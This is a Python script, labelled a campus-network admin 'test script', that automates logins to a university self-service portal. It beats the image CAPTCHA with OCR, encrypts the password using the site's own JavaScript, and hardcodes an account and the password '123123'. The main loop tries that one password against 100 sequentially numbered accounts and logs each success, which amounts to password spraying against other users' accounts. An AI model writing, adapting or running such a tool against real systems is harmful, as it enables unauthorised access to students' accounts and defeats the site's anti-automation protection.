"""
校园网管理后台测试脚本
"""
from io import BytesIO

import easyocr  # 使用 easyocr 替换 tesserocr
import execjs
import numpy as np
import requests
from PIL import Image
from bs4 import BeautifulSoup
from loguru import logger

# 配置基本信息
account = '20232430106'
password = '123123'
BASE_URL = 'http://172.16.29.10:8080'
SESSION = requests.Session()

# Cookies 和 Headers 设置
COOKIES = {
    'JSESSIONID': '',
    'rmbUser': 'true',
    'userName': account,
    'passWord': '',
    'oldpassWord': '',
}

HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': BASE_URL,
    'Pragma': 'no-cache',
    'Referer': f'{BASE_URL}/zizhu/module/scgroup/web/login_self.jsf',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

# 初始化 easyocr 识别器
reader = easyocr.Reader(['en'])


# 解析验证码
def get_verifycode(image_data):
    image = Image.open(image_data).convert('L')
    threshold = 220
    image_array = np.where(np.array(image) > threshold, 255, 0)
    image = Image.fromarray(image_array.astype('uint8'))

    result = reader.readtext(np.array(image))
    if result:
        image_text = ''.join([res[1] for res in result]).replace(' ', '').replace('\n', '')
        logger.info(f"获取到的验证码：{image_text}")
        return image_text
    else:
        logger.warning("验证码识别失败，返回空字符串")
        return ""


# 获取加密后的密码
def get_encrypt_password(password):
    try:
        with open('security.js', 'r', encoding='utf-8') as f:
            js = f.read()
        ctx = execjs.compile(js)
        encrypted_password = ctx.call('encryptedPassword', password)
        logger.info(f"加密后的密码：{encrypted_password}")
        return encrypted_password
    except Exception as e:
        logger.error(f"密码加密失败: {e}")
        return ""


# 获取首页并提取 JSESSIONID
def set_jsessionid():
    try:
        response = SESSION.get(f'{BASE_URL}/zizhu/', verify=False)
        response.raise_for_status()
        set_cookie = response.headers.get('Set-Cookie')
        if set_cookie:
            JSESSIONID = set_cookie.split(';')[0].split('=')[1]
            COOKIES['JSESSIONID'] = JSESSIONID
            logger.info(f"获取到的 JSESSIONID：{JSESSIONID}")
        else:
            logger.warning("未能获取到 Set-Cookie 头信息")
    except requests.RequestException as e:
        logger.error(f"获取 JSESSIONID 失败: {e}")


# 登录功能
def login():
    try:
        set_jsessionid()

        # 获取验证码
        verification_code = ""
        while len(verification_code) != 4:
            response = SESSION.get(f'{BASE_URL}/zizhu/common/web/verifycode.jsp', cookies=COOKIES, headers=HEADERS)
            verification_code = get_verifycode(BytesIO(response.content))

        encrypted_password = get_encrypt_password(password)
        COOKIES.update({
            'password': encrypted_password,
            'oldpassword': encrypted_password,
        })

        data = {
            'from': 'rsa',
            'name': account,
            'password': encrypted_password,
            'verify': verification_code,
            'verifyMsg': '',
        }

        # 登录校验
        login_response = SESSION.post(f'{BASE_URL}/zizhu/module/scgroup/web/login_judge.jsf', cookies=COOKIES,
                                      headers=HEADERS, data=data, verify=False)
        if 'webcontent/web/index_self.jsf?' not in login_response.text:
            logger.error('登录失败')
            return

        logger.info('登录成功')

        index_self_response = SESSION.get(f'{BASE_URL}/zizhu/module/webcontent/web/index_self.jsf', cookies=COOKIES,
                                          headers=HEADERS, verify=False)
        with open('index_self.html', 'w', encoding='utf-8') as f:
            f.write(index_self_response.text)

        soup = BeautifulSoup(index_self_response.text, 'html.parser')
        element = soup.find(class_='hellouserid').text.strip()
        logger.info(f"用户信息: {element}")

        return account, password
    except requests.RequestException as e:
        logger.error(f"登录过程中出错: {e}")


if __name__ == '__main__':
    logger.info("开始登录测试...")
    for _ in range(100):
        login()
        account = str(int(account) + 1)
        logger.info(f"下一个账户为: {account}")
